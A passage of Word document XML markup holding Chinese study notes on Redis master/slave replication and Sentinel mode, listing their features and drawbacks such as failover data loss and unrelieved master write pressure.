          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(master)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>,而通过复制创建出来的 服务器复制品则为从服务器(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>slave)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。只要主从服务器之间的网络连接正常，主从服 务器两者会具有相同的数据，主服务器就会一直将发生在自己身上的数据更新同步给 从服务器，从而一直保证主从服务器的数据相同。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="133" w:name="bookmark142"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="133"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">master/slave </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>角色</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="134" w:name="bookmark143"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="134"/>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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">mas ter/slave </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据相同</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="135" w:name="bookmark144"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="135"/>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降低</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>master</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>读压力在转交从库</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="bookmark145"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>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无法保证高可用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="137" w:name="bookmark146"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="137"/>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没有解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>master</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>写的压力</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="865"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="138" w:name="bookmark147"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>三</w:t>
      </w:r>
      <w:bookmarkEnd w:id="138"/>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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Re dis </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>哨兵</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Sentinel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>)模式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>3.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>哨兵模式概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Re dis sentinel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一个分布式系统中监控</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>主从服务器，并在主服务器下线时自 动进行故障转移。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>其中三个特性：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>监控</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Monitoring</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">) : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sentinel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>会不断地检查你的主服务器和从服务器是否运作正常</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>提</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Notification)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:当被监控的某个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Re dis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>服务器出现问题时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sentinel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以 通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>向管理员或者其他应用程序发送通知。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>自动故障迁</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Automatic failover)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:当一个主服务器不能正常工作时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Sentinel </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>会开始一次自动故障迁移操作。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="139" w:name="bookmark148"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="139"/>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保证高可用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="140" w:name="bookmark149"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="140"/>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监控各个节点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="141" w:name="bookmark150"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="141"/>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自动故障迁移</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>主从模式，切换需要时间丢数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>没有解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>master</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>写的压力</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="865"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="142" w:name="bookmark151"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
